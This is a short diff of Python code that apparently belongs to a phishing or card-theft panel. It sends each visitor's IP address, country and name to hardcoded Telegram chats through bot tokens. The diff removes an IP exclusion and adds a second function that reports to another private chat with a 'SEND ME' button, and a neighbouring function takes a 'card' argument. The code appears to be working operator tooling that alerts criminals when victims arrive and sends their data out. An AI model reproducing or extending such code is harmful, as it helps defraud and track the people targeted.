@@ -102,13 +102,25 @@ def ne_pizdabol(card, chat_id='-4150791967'):
 def cheltut(ip,name):
     try:
         chat_id='-4150791967'
-        if ip.find('176.101.2.213') != -1:
-            pass
         bot = Bot(token=API_TOKEN)
         message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip}\n🌏: `{get_country_by_ip(ip)}`\n🏷: `{name}`')
         bot.send_message(chat_id=chat_id, text=message, parse_mode='MarkdownV2')
     except TelegramError as e:
         print(f"Failed to send message: {e}")
+
+
+def cheltut1(ip,name):
+    bot = Bot(token=api)
+    chat_id='6679500406'
+    keyboard = [
+        [
+            InlineKeyboardButton("SEND ME", callback_data='button-me'),
+        ],
+    ]
+    message = escape_reserved_characters(f'Чувак зашел\n👮🏿‍♂️: {ip}\n🌏: `{get_country_by_ip(ip)}`\n🏷: `{name}`')
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    bot.send_message(chat_id=chat_id, text=message, reply_markup=reply_markup, parse_mode='MarkdownV2')
+
 
 def get_country_by_ip(ip_address):
     # URL для доступа к ipapi
